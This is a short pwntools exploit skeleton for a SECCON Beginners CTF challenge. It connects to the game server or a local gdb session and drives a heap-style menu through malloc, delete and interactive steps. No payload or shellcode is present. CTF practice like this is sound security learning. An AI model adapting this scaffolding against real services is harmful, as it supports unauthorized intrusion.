from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = 'elementary-rop.beginners.seccon.games'
POST = 9003
libc = ELF("./libc.so.6")


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b *main+65''')

def malloc(index):
    c.sendlineafter(b'>',b'1')
    c.sendlineafter(b'index:',str(index))

def read(index):
    c.sendlineafter(b'>',b'2')
    c.sendlineafter(b'index:',str(index))

def update(index,s):
    c.sendlineafter(b'>',b'3')
    c.sendlineafter(b'index:',str(index))
    c.sendlineafter(b'content:',str(s))

def delete(index):
    c.sendlineafter(b'>',b'4')
    c.sendlineafter(b'index:',str(index))

malloc(0)
malloc(0)
delete(0)
malloc(0)
c.interactive()